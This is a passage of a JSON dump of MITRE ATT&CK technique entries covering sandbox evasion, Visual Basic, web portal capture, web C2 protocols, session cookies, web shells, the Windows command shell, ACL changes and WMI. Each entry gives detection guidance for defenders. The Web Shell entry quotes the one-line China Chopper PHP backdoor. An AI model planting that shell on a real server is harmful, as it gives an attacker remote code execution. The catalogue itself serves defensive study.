2015\",\"url\":\"https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/\"}],\"id\":\"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-07-01T16:32:02.272Z\",\"name\":\"Virtualization/Sandbox Evasion\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Deloitte Threat Library Team\",\"Sunny Neo\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host forensic analysis\",\"Signature-based detection\",\"Static File Analysis\"],\"x_mitre_detection\":\"Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary\'s implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2020-03-09T14:29:51.508Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\\n\\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Office applications.(Citation: Microsoft VBA)  VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\\n\\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.\",\"external_references\":[{\"external_id\":\"T1059.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059/005\"},{\"description\":\".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.\",\"source_name\":\"VB .NET Mar 2020\",\"url\":\"https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/\"},{\"description\":\"Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.\",\"source_name\":\"VB Microsoft\",\"url\":\"https://docs.microsoft.com/dotnet/visual-basic/\"},{\"description\":\"Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.\",\"source_name\":\"Microsoft VBA\",\"url\":\"https://docs.microsoft.com/office/vba/api/overview/\"},{\"description\":\"Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.\",\"source_name\":\"Microsoft VBScript\",\"url\":\"https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)\"}],\"id\":\"attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-06-25T03:32:51.046Z\",\"name\":\"Visual Basic\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DLL monitoring\",\"Loaded DLLs\",\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\\n\\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:59:50.058Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\\n\\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)\",\"external_references\":[{\"external_id\":\"T1056.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1056/003\"},{\"external_id\":\"CAPEC-569\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/569.html\"},{\"description\":\"Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.\",\"source_name\":\"Volexity Virtual Private Keylogging\",\"url\":\"https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/\"}],\"id\":\"attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T21:16:16.580Z\",\"name\":\"Web Portal Capture\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\"],\"x_mitre_detection\":\"File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server\'s content.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"An externally facing login portal is configured.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-15T16:13:46.151Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. \",\"external_references\":[{\"external_id\":\"T1071.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1071/001\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T20:15:35.821Z\",\"name\":\"Web Protocols\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Process monitoring\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\\n\\nMonitor for web traffic to/from known-bad or suspicious domains. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:13.915Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\\n\\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\",\"external_references\":[{\"external_id\":\"T1102\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1102\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--830c9528-df21-472c-8c14-a036bf17d665\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T23:26:10.297Z\",\"name\":\"Web Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Anastasios Pingios\"],\"x_mitre_data_sources\":[\"Host network interface\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"Packet capture\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2019-10-08T20:08:56.205Z\",\"external_references\":[{\"external_id\":\"T1506\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1506\"},{\"description\":\"Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.\",\"source_name\":\"Pass The Cookie\",\"url\":\"https://wunderwuzzi23.github.io/blog/passthecookie.html\"},{\"description\":\"Chen, Y., Hu, W., Xu, Z., et. al.. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.\",\"source_name\":\"Unit 42 Mac Crypto Cookies January 2019\",\"url\":\"https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/\"}],\"id\":\"attack-pattern--c5e31fb5-fcbd-48a4-af8c-5a6ed5b932e5\",\"modified\":\"2020-01-30T19:59:18.617Z\",\"name\":\"Web Session Cookie\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-30T17:48:49.395Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\\n\\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\\n\\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)\",\"external_references\":[{\"external_id\":\"T1550.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1550/004\"},{\"description\":\"Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.\",\"source_name\":\"Pass The Cookie\",\"url\":\"https://wunderwuzzi23.github.io/blog/passthecookie.html\"},{\"description\":\"Chen, Y., Hu, W., Xu, Z., et. al.. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.\",\"source_name\":\"Unit 42 Mac Crypto Cookies January 2019\",\"url\":\"https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/\"}],\"id\":\"attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-24T12:36:24.501Z\",\"name\":\"Web Session Cookie\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Johann Rehberger\"],\"x_mitre_data_sources\":[\"Office 365 audit logs\",\"Authentication logs\"],\"x_mitre_defense_bypassed\":[\"System Access Controls\"],\"x_mitre_detection\":\"Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Office 365\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:13.061Z\",\"external_references\":[{\"external_id\":\"T1100\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1100\"},{\"external_id\":\"CAPEC-650\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/650.html\"},{\"description\":\"Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015.\",\"source_name\":\"Lee 2013\",\"url\":\"https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html\"},{\"description\":\"US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.\",\"source_name\":\"US-CERT Alert TA15-314A Web Shells\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA15-314A\"}],\"id\":\"attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df\",\"modified\":\"2020-03-19T20:22:02.163Z\",\"name\":\"Web Shell\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-12-13T16:46:18.927Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\\n\\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013) \",\"external_references\":[{\"external_id\":\"T1505.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1505/003\"},{\"description\":\"Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015.\",\"source_name\":\"Lee 2013\",\"url\":\"https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html\"},{\"description\":\"US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.\",\"source_name\":\"US-CERT Alert TA15-314A Web Shells\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA15-314A\"}],\"id\":\"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-04-17T17:47:56.673Z\",\"name\":\"Web Shell\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Netflow/Enclave netflow\",\"File monitoring\",\"Authentication logs\"],\"x_mitre_detection\":\"Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) \\n\\n<code>&lt;?php @eval($_POST[\'password\']);&gt;</code>\\n\\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server\'s content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_system_requirements\":[\"Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:00.200Z\",\"external_references\":[{\"external_id\":\"T1077\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1077\"},{\"external_id\":\"CAPEC-561\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/561.html\"},{\"description\":\"Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016.\",\"source_name\":\"Wikipedia SMB\",\"url\":\"https://en.wikipedia.org/wiki/Server_Message_Block\"},{\"description\":\"Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.\",\"source_name\":\"TechNet RPC\",\"url\":\"https://technet.microsoft.com/en-us/library/cc787851.aspx\"},{\"description\":\"Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.\",\"source_name\":\"Microsoft Admin Shares\",\"url\":\"http://support.microsoft.com/kb/314984\"},{\"description\":\"Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.\",\"source_name\":\"Technet Net Use\",\"url\":\"https://technet.microsoft.com/bb490717.aspx\"},{\"description\":\"Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.\",\"source_name\":\"Lateral Movement Payne\",\"url\":\"https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts\"},{\"description\":\"Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.\",\"source_name\":\"Windows Event Forwarding Payne\",\"url\":\"https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem\"},{\"description\":\"French, D. (2018, September 30). Detecting Lateral Movement Using Sysmon and Splunk. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting Lateral Movement\",\"url\":\"https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc\"}],\"id\":\"attack-pattern--ffe742ed-9100-4686-9e00-c331da544787\",\"modified\":\"2020-03-23T19:54:12.651Z\",\"name\":\"Windows Admin Shares\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-09T14:12:31.196Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the Windows command shell for execution. The Windows command shell (<code>cmd.exe</code>) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. \\n\\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\\n\\nAdversaries may leverage <code>cmd.exe</code> to execute various commands and payloads. Common uses include <code>cmd.exe /c</code> to execute a single command, or abusing <code>cmd.exe</code> interactively with input and output forwarded over a command and control channel.\",\"external_references\":[{\"external_id\":\"T1059.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1059/003\"}],\"id\":\"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-28T17:02:13.722Z\",\"name\":\"Windows Command Shell\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\\n\\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-04T19:17:41.767Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\\n\\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\\n\\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\",\"external_references\":[{\"external_id\":\"T1222.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1222/001\"},{\"description\":\"Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.\",\"source_name\":\"Hybrid Analysis Icacls1 June 2018\",\"url\":\"https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100\"},{\"description\":\"Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.\",\"source_name\":\"Hybrid Analysis Icacls2 May 2018\",\"url\":\"https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110\"},{\"description\":\"Microsoft. (2018, May 30). DACLs and ACEs. Retrieved August 19, 2018.\",\"source_name\":\"Microsoft DACL May 2018\",\"url\":\"https://docs.microsoft.com/windows/desktop/secauthz/dacls-and-aces\"},{\"description\":\"M. Satran, M. Jacobs. (2018, May 30). Access Control Lists. Retrieved February 4, 2020.\",\"source_name\":\"Microsoft Access Control Lists May 2018\",\"url\":\"https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists\"},{\"description\":\"Netsurion. (2014, February 19). Monitoring File Permission Changes with the Windows Security Log. Retrieved August 19, 2018.\",\"source_name\":\"EventTracker File Permissions Feb 2014\",\"url\":\"https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/\"}],\"id\":\"attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T23:07:55.953Z\",\"name\":\"Windows File and Directory Permissions Modification\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\\n\\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:44.329Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\\n\\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)\",\"external_references\":[{\"external_id\":\"T1047\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1047\"},{\"description\":\"Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016.\",\"source_name\":\"Wikipedia SMB\",\"url\":\"https://en.wikipedia.org/wiki/Server_Message_Block\"},{\"description\":\"Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.\",\"source_name\":\"TechNet RPC\",\"url\":\"https://technet.microsoft.com/en-us/library/cc787851.aspx\"},{\"description\":\"Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.\",\"source_name\":\"MSDN WMI\",\"url\":\"https://msdn.microsoft.com/en-us/library/aa394582.aspx\"},{\"description\":\"Devon Kerr. (2015). There\'s Something About WMI. Retrieved May 4, 2020.\",\"source_name\":\"FireEye WMI SANS 2015\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf\"},{\"description\":\"Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.\",\"source_name\":\"FireEye WMI 2015\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\"}],\"id\":\"attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-05-13T22:50:51.258Z\",\"name\":\"Windows Management Instrumentation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication 